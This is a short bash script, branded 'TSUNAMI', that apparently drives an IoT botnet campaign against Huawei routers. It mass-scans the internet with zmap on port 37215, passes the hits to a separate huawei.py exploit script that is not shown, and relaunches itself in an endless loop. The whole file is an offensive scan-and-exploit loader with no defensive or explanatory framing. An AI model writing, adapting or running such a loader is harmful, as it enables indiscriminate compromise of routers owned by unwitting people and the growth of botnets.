#!/bin/bash
clear
echo -e "\e[1;97m[\e[1;36mTSUNAMI\e[1;97m] \e[1;36mNow Auto-Scanning Huawei"
zmap -p37215 -o huawei -B100M -N 100000
ulimit -n 999999
python huawei.py huawei
rm -rf jp
clear
sh huawei.sh
